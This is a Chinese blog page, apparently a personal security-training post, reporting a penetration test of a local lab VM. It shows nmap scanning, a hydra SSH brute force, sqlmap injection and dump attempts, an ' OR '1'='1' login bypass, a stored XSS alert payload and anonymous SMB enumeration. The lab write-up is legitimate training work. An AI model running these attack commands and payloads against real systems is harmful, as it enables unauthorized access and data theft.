@@ -1,0 +1,418 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>1.22靶场渗透报告 | Tubby Little Hero</title><meta name="author" content="Tubby Little Hero"><meta name="copyright" content="Tubby Little Hero"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶场渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="1.22靶场渗透报告">
+<meta property="og:url" content="http://example.com/2026/01/22/1.22%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:site_name" content="Tubby Little Hero">
+<meta property="og:description" content="靶场渗透">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/leisai.jpg">
+<meta property="article:published_time" content="2026-01-22T00:18:55.000Z">
+<meta property="article:modified_time" content="2026-03-19T02:58:51.000Z">
+<meta property="article:author" content="Tubby Little Hero">
+<meta property="article:tag" content="web渗透">
+<meta property="article:tag" content="实战">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/leisai.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "1.22靶场渗透报告",
+  "url": "http://example.com/2026/01/22/1.22%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/",
+  "image": "http://example.com/img/leisai.jpg",
+  "datePublished": "2026-01-22T00:18:55.000Z",
+  "dateModified": "2026-03-19T02:58:51.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Tubby Little Hero",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/01/22/1.22%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%8A%A5%E5%91%8A/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Tubby Little Hero","link":"链接: ","source":"来源: Tubby Little Hero","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '1.22靶场渗透报告',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  #page-header,
+  #page-header::before,
+  #footer {
+    background: transparent !important;
+  }
+  #nav,
+  .card-widget,
+  #recent-posts > .recent-post-item,
+  .layout,
+  #content-inner,
+  #post {
+    background: rgba(255, 255, 255, 0.5) !important;
+  }
+</style>
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/leisai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/leisai.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Tubby Little Hero</span></a><a class="nav-page-title" href="/"><span class="site-name">1.22靶场渗透报告</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">1.22靶场渗透报告</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-22T00:18:55.000Z" title="发表于 2026-01-22 08:18:55">2026-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-19T02:58:51.000Z" title="更新于 2026-03-19 10:58:51">2026-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E6%B8%97%E9%80%8F-%E7%BD%91%E5%AE%89/">web渗透 网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;距离上一次更新已经过去了&quot;,&quot;messageNext&quot;:&quot;天，文章内容可能已经过时。&quot;,&quot;postUpdate&quot;:&quot;2026-03-19 10:58:51&quot;}" hidden></div><p>1.22 靶场渗透报告</p>
+<h2 id="是一个打包好的镜像文件">是一个打包好的镜像文件</h2><p>直接用 <code>VMware</code>打开，选择我已移动不然没网</p>
+<h2 id="信息收集">信息收集</h2><h3 id="1-1-arp-scan-l寻找目标靶机的-IP-地址">1.1 <code>arp scan -l</code>寻找目标靶机的 IP 地址</h3><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQ5YjlmMzhlMDc0MjI0ZGRkY2UyNzA2MDNiNmNjMzNfRzlmZWRLMURxeHlBdTREamlBM1NTdTV5dzdqVTFJd2ZfVG9rZW46TnR2WWJ6OHdJbzJ2OUR4bFl1amNlQWF4bk1nXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="1-2-使用-Nmap-扫描出开放服务及操作系统版本">1.2 使用 Nmap 扫描出开放服务及操作系统版本</h3><p>使用 <code>nmap -sS -sV -sC -p- 192.168.5.136</code> 扫描端口开放的服务和版本</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU3Y2EyYjA0ZjNhNWJkYWQ3NGUwOGQzZTA4NTc4ZWJfcGdMWHlxOGM2dVgyNzExdld1N1hqZlhUVkJLYkcxeEpfVG9rZW46Rmd3WGJWak5Zb3k1YzB4a2I2M2NwU2dnbkhmXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="1-3-开放的端口有">1.3 开放的端口有</h3><table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 5.1p1 Debian 5</td>
+</tr>
+<tr>
+<td>25</td>
+<td>SMTP</td>
+<td>Exim smtpd 4.50</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache 2.2.9 + PHP 5.2.6 + Suhosin-Patch</td>
+</tr>
+<tr>
+<td>139&#x2F;445</td>
+<td>SMB</td>
+<td>Samba 3.X-4.X</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+<td>5.0.51a-24+lenny4</td>
+</tr>
+<tr>
+<td>7777</td>
+<td>未知服务</td>
+<td>无明确版本</td>
+</tr>
+</tbody></table>
+<h3 id="1-4-扫描目录">1.4 扫描目录</h3><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA3Yzc0ZjBmYzVkNWJjN2M4MjEyOWQ0NDgwOTZlNGFfanNmTGxGOVVtbnpSWHYyZFJDR3BDeUtZdWZWaGFEdldfVG9rZW46S05NdWJpY01jb1ZGYUp4QkkwMWNJcVgybnZnXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h2 id="漏洞分析">漏洞分析</h2><h3 id="2-1-ssh弱口令爆破">2.1 ssh弱口令爆破</h3><p>先自己写了一个用户名的字典<code>echo -e &quot;root\nadmin\ndebian\nwww-data\nmysql&quot; &gt; /tmp/debian_users.txt</code></p>
+<p>再用<code>hydra</code>暴力破解 <code>hydra -L /tmp/debian_users.txt -P /usr/share/wordlists/rockyou.txt -t 4 192.168.5.136 ssh</code></p>
+<p>但是这个 ssh 版本太老了所以没有成功</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ODZkZWVhYzQxODdjZDE1NTQ1OWZmOWQwNzBiODMyMGFfTUhXd0FVbk5UaDlidGtQb0FOZldVem0xNTdybHVFTFFfVG9rZW46SkxpNGJaZTBUb3BSWXN4OUJ1UmNFUHFQbm1oXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-2-80端口-http-192-168-5-136-admin-post-php-的-sql-注入">2.2 80端口 <a target="_blank" rel="noopener" href="http://192.168.5.136/admin/post.php">http://192.168.5.136/admin/post.php</a> 的 sql 注入</h3><h4 id="2-2-1注入点在-username（sql-1-）">2.2.1注入点在 <code>username</code>（sql 1 ）</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ODAyNzU0ZTIxNDlhNTA2NjIzNzE3NGVkMGU0ZGVkMjlfRXhLQlp1d1VjdFlsMUdUOEpHVDRHcUVHRVRtVFRzTG1fVG9rZW46R29uZmJSajhrbzJaYmZ4UW12bWNRUGQ2bjRiXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>输入 ‘ 尝试闭合发现报错</p>
+<p>说明存在 sql 注入</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NTM0NThlNjFiMjVjY2Y5ZTEyNzcxNDM5NTYyYjQyMWFfdXFTNWFiaWxiRjVmU2xlaTgzVnlYWjl5bUtHQzVSVVVfVG9rZW46R090NWJpamFzb3VCMDR4bjZOYmNTaE1IbkJmXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>而且 <code>url</code>中没有回显，是 post 传参</p>
+<p>使用 <code>burpsuit</code>抓包</p>
+<p>发现传的参数有好几个：</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmNhNTk5MDNlMTMwOTQzZTU1YmUxYjVjMWEwNGViZWRfdm5rQ2h1OE1ROW9zVmhWZGR6NDZ2RnV5ZHAwTXdVSWtfVG9rZW46RjBENWI4dTRSb1IydUV4Z3BsMWNJdHpVbmFkXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>把这个请求包保存到 <code>flag.txt</code> 文件中</p>
+<p>使用 <code>sqlmap</code> 测试 <code>username</code> <code>sqlmap -r flag.txt -p username</code></p>
+<p>发现存在布尔盲注和时间盲注</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTExZDY2MTA4ZmFhNDcxZGJkYTY3ZGRlZGMxOGQ2YjdfSFc5Mk5sYnUxQnV3RnM5b0JZQnhTRjQzZU5DeThhQVBfVG9rZW46RmtUcmJpTGhUb2VYQUV4NUR2SmN5OHZYbmJKXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>尝试脱库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r flag.txt -p username --dbs</span><br></pre></td></tr></table></figure>
+
+<p>但是失败了可能权限不够，或者盲注连接失败</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YmYzMjM3YzEyM2M3OGY2ZTgyNDdjMjVlMzVmNGYxYjVfb3hsNW1OQzdvdEJwWUhVY0hnNzVaQ0RwRlFERDRtRnhfVG9rZW46S1lKNWJaR1VFb2w2VHl4WW1HZWNRT2w2bklnXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h4 id="2-2-1-注入点在-password（sql-2-）">2.2.1 注入点在 password（sql 2 ）</h4><p>使用 <code>sqlmap</code> 测试 <code>username</code> <code>sqlmap -r flag.txt -p password </code></p>
+<p>发现存在时间盲注</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YjFiNDA1YjgwYzRhMTk5MDc0OWRlMjViYzM2ZjJkYTlfekVIODdvY0VESHVKN0NZT0IyWEtvaHNqdzVtQnVtcFZfVG9rZW46QVRpamJRMFdlb1FuZGp4bldsd2NQTjVrbk1iXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>尝试脱库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r flag.txt -p password --dbs</span><br></pre></td></tr></table></figure>
+
+<p>但是失败了可能权限不够，或者盲注连接失败</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MDNhN2QxMTY4MDA4MTE5M2VhZDdiZjRmZjM3NzYyZjdfWFRETHZ0cTNBbk9jbGhMQnVDTGFYaHUyZXA5QUNRQkNfVG9rZW46VmlPWWJSMlY2b0pDeFp4U2lMcGNJckt6bjlkXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-3-80端口-http-192-168-5-136-admin-profile-php-的-sql-注入">2.3 80端口 <a target="_blank" rel="noopener" href="http://192.168.5.136/admin/profile.php">http://192.168.5.136/admin/profile.php</a> 的 sql 注入</h3><h4 id="2-3-1注入点在-username（sql-3-）">2.3.1注入点在 <code>username</code>（sql 3 ）</h4><p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MmJiZjI1YWQzMTk2MjM0NGJkY2M3ZGNjZTUzZDhkM2VfMkN3eU10a3lpVHFNNUU1NTJzOUJ1OGFiTmdER2dDN1pfVG9rZW46SXc1emJ3UGx3b0tCSmh4T0lEQWM2RzhJbjAyXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>输入 ‘ 尝试闭合发现报错</p>
+<p>说明存在 sql 注入</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MjZkZWEwODQxOTZkZDRiYjVjZDE3NWNiMzNkYmEwZWRfMFRUZTd2amUwb3Z2dzdwM3FTVnlIU1FQNEE1bUZIeWtfVG9rZW46U0R4UWJxOUlZb09qdnZ4eXJ2SGN4b1VPbkJoXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>而且 <code>url</code>中没有回显，是 post 传参</p>
+<p>使用 <code>burpsuit</code>抓包</p>
+<p>发现传的参数有好几个：</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDdjNDJlNzk2YWJlOTY2ZjNmODVjM2FiMDJhNTEyN2FfQ0tQVzBTRHV1M3JiVTJvSDJwT1Q0dngzemt4aTQ4SmpfVG9rZW46RmptZWJ3TUNXb2d1TTJ4d3Zxa2MyNXRUblRiXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>把这个请求包保存到 <code>flag.txt</code> 文件中</p>
+<p>使用 <code>sqlmap</code> 测试 <code>username</code> <code>sqlmap -r flag.txt -p username</code></p>
+<p>发现存在布尔盲注和时间盲注</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2MxMzRmZjY4YTk0ZjMwNTRjMjYwODk2NWM3MjFiNTJfTG9OU1kxd2JPTmJmZTM1V1RmTWxnZG1DUlphZFVieUVfVG9rZW46VmxWRGIycUJOb2JEWm94dmxhWGNTVGlkblYwXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>尝试脱库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r flag.txt -p username --dbs</span><br></pre></td></tr></table></figure>
+
+<p>但是失败了可能权限不够，或者盲注连接失败</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTIxMzRlMzM3YzFhNWE4MjhkZGI4YzQ2MTk2NWY4MmFfb1RNaHZQenFBb2ZmMzR3Wnp0dEhQdm9QQm9QZUEybjlfVG9rZW46UE1HR2JqM1BIb3ZhNEx4U21GdmNlRkZ3bnF5XzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h4 id="2-3-2-注入点在-password-（sql-4-）">2.3.2 注入点在 password （sql 4 ）</h4><p>使用 <code>sqlmap</code> 测试 <code>username</code> <code>sqlmap -r flag.txt -p password </code></p>
+<p>发现存在时间盲注</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=OWRlNGRjZDdlNmE1MTdjMTRlNzllM2I4M2RkZmUxNDlfT3lEaFRRdWVQdHd5TDFTbE9vMlV5MFBMaXZzUTRVa3dfVG9rZW46TUtCVmI1MEFNbzJpTzV4b1lQYmNuc2l2bjFiXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>尝试脱库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r flag.txt -p password --dbs</span><br></pre></td></tr></table></figure>
+
+<p>但是失败了可能权限不够，或者盲注连接失败</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MjE5MTUyOWEwN2IxNGQ1NDNkYTEyNTExMjE1MmU0MjBfTWtFUUtycXVBQ0hIeUpHWk1xZEVyU0FxeGltODNkblJfVG9rZW46TVhrU2JZc0RFb2psOEl4MUlES2NEc0RJbk1iXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-4-80端口-http-192-168-5-136-view-的sql注入">2.4 80端口 <a target="_blank" rel="noopener" href="http://192.168.5.136/view">http://192.168.5.136/view</a> 的sql注入</h3><p>这个页面回显有问题</p>
+<p>说是缺少 id</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=MDY4OGFhMTljMzFkMDRjZTI1NGY4ZmU1ODMzNTdlZGRfVDNiMXd6d0RrUFFsZjl4RWx4TVFDbjcwWkNXNERKbnpfVG9rZW46WXNlZGJBQTQ1b2NGdWx4ZTZOVGMzMkhSbkFoXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>加上 id </p>
+<p>明显是一个 get 请求的 sql 注入</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NmNhZWMwNDFkNjA5OWRiMWIxYTc0YjVkZDUxMDk2OTVfMDl0bzB0eG1FR1JWcHlaVVc0Z3EwdDFkS0JoSEhXdXNfVG9rZW46QjdiQmJJazJwb25Sb0F4QmpTSmNaN2M4bk1iXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-4-sql注入万能密码">2.4 sql注入万能密码</h3><p>既然无法脱库，那就利用注入点使用万能密码，登录进去完成这个表单的功能</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Username</span> = admin</span><br><span class="line"><span class="title class_">Password</span> = <span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+
+<p>成功登录</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGYyODQ3MjYyZGNiOWRmNTk2NmUyNDcwNDBiNjMxMTVfWnU0WXpEUEdZZ1pRbWhHM21FOFB4cjNmZkxrUkJkRjBfVG9rZW46S1ZLdWJsaDhYbzVhU1R4SEt2NWNQUHJRbkdxXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NzhjM2M5YTk2MGU1MWYzMDYxYjFmMmYzOTBjNmU4YjdfYmF5SGZDVlF5am9iOG4xaVpKdWZ2eEJsd3lJeEdwWDVfVG9rZW46VlVTc2JqaFhOb293NnJ4NFJ3S2NhWm9zbnViXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-5-xss">2.5 xss</h3><h4 id="存储型xss（1）">存储型xss（1）</h4><p>在登录的时候在 body 里面加入 xss 恶意代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQzMjRlMGFhYWQwMzdkZjczM2M4Y2UzNWNmZDE4NDZfZVFmUG1ta0g1MDhHN1RiOEtXQXp2STZHbU1ITk1mZmdfVG9rZW46TXd2MWJjQW5zbzRJQ3F4Nk9VOWMwMDBzblBkXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>回到 <code>http://192.168.5.136/myblog.php</code> 这个页面就会出现 弹窗</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWE0NDBhNWVlMTI4ZjRmNWM1YjEwOGQ2NjZlMDNkYjFfN29jeDRmblBjd2hHbDZZdmpMSnZ6RzladlozZTh3MkNfVG9rZW46UEZhVmJROThNb1NFVVd4d0pUZWNJTlRXbjdiXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h4 id="存储型xss（2）">存储型xss（2）</h4><p>在另一个登录页面同样这样执行</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmQ0OTQ5Yjk0OTU0OWE2NDI5NmE1MTI1YjNmZDRjZGVfU2tNM0p1WkZaZHZrU05JelRCZXNGWnhXdHVGeEtUN0RfVG9rZW46SFRieWJ4dGxzb0d6YW54SGd5R2NxT3lWbnloXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<p>回到 <code>http://192.168.5.136/myblog.php</code> 这个页面就会出现 弹窗</p>
+<p><img src="https://pcnm3h7ebxgf.feishu.cn/space/api/box/stream/download/asynccode/?code=YjkyYmZlOTRmNDU3MmU5NTZmNjhiN2NhNWQ1ODE3ZjdfZDZ0UlpnZ3AzVEo0QzJJVGhoM2IzQ01CYUlYd2xJa1BfVG9rZW46RG9Za2JIRFhQb283alZ4Szg4emNJbFVJbjJiXzE3NzM5MTc4Nzc6MTc3MzkyMTQ3N19WNA" alt="img"></p>
+<h3 id="2-6-SMB-服务（139-445）SMB-允许-guest-匿名访问">2.6  <strong>SMB 服务（139&#x2F;445）SMB 允许 guest 匿名访问</strong></h3><p>报告显示 <strong>SMB 允许 guest 匿名访问</strong>，且 Samba 版本老旧，这是最高优先级目标：</p>
+<p><strong>第一步：枚举共享目录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.5.136 -N  # -N 表示无需密码</span><br></pre></td></tr></table></figure>
+
